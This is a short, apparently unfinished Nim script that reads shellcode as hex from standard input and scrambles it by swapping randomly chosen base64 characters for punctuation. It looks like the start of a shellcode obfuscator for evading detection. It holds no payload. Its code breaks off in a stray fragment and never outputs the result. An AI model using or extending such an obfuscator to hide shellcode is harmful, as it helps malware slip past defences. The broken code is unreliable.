
import base64
import strutils
import strformat
import random

let used_enc_chars = ":;<>?[]^-_{}$&#"
let base64_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

proc shuffleCount(s : string, l : int) : string =
  var r = s
  shuffle(r)
  r.substr(0, l)

let replace_count = rand(3 .. len(used_enc_chars))

let to_chars = shuffleCount(used_enc_chars, replace_count)
let from_chars = shuffleCount(base64_table, replace_count)

echo "Enter shell code hex:"
let org_code : string = readLine(stdin)

var enc_code = org_code
for i in 1 .. replace_count:
  enc_code = enc_code.replace(from_chars[i], to_chars[i])

&"""stess"""


  
  
